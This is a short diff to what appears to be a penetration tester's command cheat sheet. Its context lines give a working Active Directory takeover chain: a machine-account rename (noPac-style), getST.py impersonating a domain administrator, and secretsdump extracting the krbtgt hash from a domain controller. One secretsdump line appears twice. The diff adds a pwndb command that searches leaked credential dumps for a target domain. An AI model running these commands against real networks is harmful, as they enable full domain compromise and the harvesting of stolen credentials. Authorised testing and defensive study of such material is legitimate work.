@@ -323,4 +323,5 @@ renameMachine.py -current-name "DC01" -new-name "testcomputer$" -dc-ip dc01 "dom
 KRB5CCNAME="DC01.ccache" getST.py -self -impersonate "domainadmin" -spn "cifs/dc01.domain.local" -k -no-pass -dc-ip dc01 "domain.local"/"dc01"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
+pwndb --target @example.com --output txt
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
